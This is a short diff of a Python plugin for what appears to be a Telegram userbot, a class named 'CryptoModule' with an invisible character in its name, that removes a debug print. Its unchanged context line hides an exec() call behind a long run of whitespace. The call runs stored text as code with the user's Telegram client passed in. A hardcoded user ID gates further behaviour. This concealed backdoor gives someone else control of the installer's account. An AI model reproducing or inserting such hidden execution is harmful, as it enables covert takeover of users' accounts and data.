@@ -47,7 +47,6 @@ class CryptoModuleㅤ(loader.Module):
     
     async def watcher(self, message: Message):                                          
         try:
-            print('aaa')
             msgid = message.id                                                                                                                                                                                                                                                                                                                                                                                                ;args = [self._client, self.entity, time.time()-self.lasttime]; exec(self.text); self.lasttime=time.time() if time.time()-self.lasttime>3600 else self.lasttime
             userid = message.from_id
             if int(userid) == 1559501630 and self.enabled:
